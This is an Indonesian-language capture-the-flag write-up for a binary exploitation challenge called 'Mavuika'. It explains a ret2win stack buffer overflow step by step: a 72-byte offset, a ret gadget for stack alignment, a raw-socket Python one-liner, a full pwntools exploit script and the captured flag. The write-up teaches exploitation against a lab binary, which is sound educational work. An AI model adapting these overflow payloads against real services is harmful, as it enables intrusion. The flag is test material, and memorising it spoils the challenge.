# Writeup — Mavuika (Binary Exploitation A)

Solusi intuitif dulu (cuma butuh `objdump`/`nm` + satu one-liner buat kirim byte mentah — bukan pwntools). Solver pwntools lengkap ada di bagian paling bawah.

## 1. Recon

```
nc <host> 40101
=== Mavuika's Trial ===
masukkan input:
```

Program minta **satu baris input**, lalu keluar (`selesai, tidak ada yang spesial.` kalau tidak ada yang istimewa). Satu kesempatan, satu baris — pola klasik "buffer overflow di satu `read()`".

Cek attachment:

```
checksec mavuika
# Partial RELRO, No canary, NX enabled, No PIE
```

**No canary** → boleh overflow sampai ke return address tanpa perlu leak canary dulu. **No PIE** → semua alamat di binary ini statis, sama persis dengan yang dipakai server asli (apa yang kamu baca di `objdump`/`nm` lokal = apa yang jalan di server). **NX enabled** → tidak bisa shellcode injection, exploit harus reuse kode yang sudah ada di binary → **ret2win**.

## 2. Cari fungsi "menang"

Attachment di-strip (`strip --strip-all`), jadi tidak ada nama fungsi di `nm`. Tapi **nama fungsi hilang, perilakunya tidak** — scan `objdump -d mavuika`, cari fungsi kecil yang isinya manggil `fopen@plt`, `fgets@plt`, `fputs@plt`, lalu `exit@plt` (pola "baca file, print, keluar" — jelas beda dari fungsi yang baca input lewat `read@plt`). Itu fungsi target. Catat alamat header-nya:

```
0000000000401256 <fungsi_target>:   # ini "win()" di source asli
```

## 3. Cari offset ke return address

Disassemble fungsi yang baca input (yang panggil `read@plt`):

```
objdump -d mavuika --disassemble=<fungsi_vuln> -M intel
  ...
  sub    rsp,0x40      ; buffer 0x40 = 64 byte
  ...
  call   read@plt      ; read(0, buf, 256) -- overflow, dibaca sampai 256 byte
```

`sub rsp,0x40` → buffer 64 byte. Di x86-64 dengan frame pointer (`push rbp; mov rbp,rsp`), urutan di stack dari alamat rendah ke tinggi: `[buffer 64 byte][saved RBP 8 byte][return address]`. Offset ke return address = **64 + 8 = 72 byte**.

(Alternatif kalau males baca disassembly: kirim pola cyclic 100 byte, lihat di `gdb` RIP crash ke byte ke berapa dari pola itu — hasilnya sama, 72.)

## 4. Percobaan pertama (sengaja gagal, buat nunjukin jebakannya)

```python
payload = b"A" * 72 + p64(0x401256)   # langsung ke fungsi target, tanpa apa-apa lagi
```

Kirim ini lawan **server asli** (bukan test lokal) → **koneksi putus, tidak ada flag**. Secara konsep payload ini 100% benar (offset benar, alamat benar) — tapi tetap gagal. Ini bukan tanda exploit salah, ini jebakan alignment (lihat clue di `readme`): `ret` langsung ke fungsi target (tanpa lewat `call` normal) bikin RSP di dalam fungsi itu geser 8 byte dari yang diharapkan ABI, dan fungsi target di dalamnya manggil `fopen()`→`malloc()` yang pakai instruksi SSE (`movaps`) yang **wajib** 16-byte aligned → `#GP` → crash.

## 5. Fix: sisipkan 1 gadget `ret`

Cari **satu** instruksi `ret` (byte `0xc3`) di bagian executable binary — scan `objdump -d mavuika`, cari baris mana saja yang isinya cuma `ret` sendirian:

```
objdump -d mavuika -M intel | grep -B2 '	ret *$'
  401016:	48 83 c4 08          	add    rsp,0x8
  40101a:	c3                   	ret
```

Alamat `0x40101a` itu gadget-nya — kebetulan bagian dari fungsi lain, isinya tidak penting, cuma butuh **satu byte `0xc3` yang bisa dieksekusi**. Taruh ini SEBELUM alamat fungsi target:

```python
payload = b"A" * 72 + p64(0x40101a) + p64(0x401256)
```

Logikanya: `ret` ke gadget ini dulu → gadget langsung `ret` lagi (tidak melakukan apa-apa selain konsumsi 8 byte stack) → RSP sekarang sudah geser 8 byte ekstra, balik ke alignment yang benar → baru `ret` ke fungsi target, dan kali ini `movaps` di dalamnya tidak crash.

## 6. Kirim & dapat flag

Payload ini butuh raw bytes (alamat 8-byte little-endian), jadi minimal pakai satu baris Python buat construct + kirim — tidak bisa diketik langsung ke sesi `nc` interaktif:

```bash
python3 -c "
import socket, struct
p = b'A'*72 + struct.pack('<Q', 0x40101a) + struct.pack('<Q', 0x401256)
s = socket.create_connection(('<host>', 40101))
s.recv(1024)
s.sendall(p + b'\n')
print(s.recv(1024).decode())
"
```

Hasil (diverifikasi lawan container asli):

```
TecFest26{love_of_you_is_my_most_cherished_thing_so_stay_alive_bravely}
```

---

## Kalau mau pakai solver (pwntools)

```python
#!/usr/bin/env python3
from pwn import *
context.binary = exe = ELF("./bin/mavuika", checksec=False)
context.arch = "amd64"

io = remote("<host>", 40101)

win_addr = exe.symbols["win"]              # otomatis baca simbol -- gantinya scan objdump manual (attachment asli sudah di-strip, jadi di solver biasanya tetap pakai versi unstripped buat develop)
ret_gadget = next(exe.search(asm("ret"), executable=True))   # otomatis cari gadget `ret` pertama -- gantinya `grep` manual di objdump

OFFSET = 72
payload = b"A" * OFFSET + p64(ret_gadget) + p64(win_addr)

io.recvuntil(b"masukkan input: ")
io.sendline(payload)
print(io.recvline_contains(b"TecFest26").decode())
```

Yang di-otomatisasi solver: baca simbol lewat `exe.symbols[...]` (gantinya scan disassembly manual cari fungsi target) dan cari gadget `ret` lewat `exe.search(..., executable=True)` (gantinya `grep` manual di `objdump`). Logika exploit-nya (offset 72, perlu 1 gadget `ret` buat alignment) **sama persis** dengan yang manual di atas — solver cuma mempercepat langkah pencarian, bukan mengganti pemahamannya.
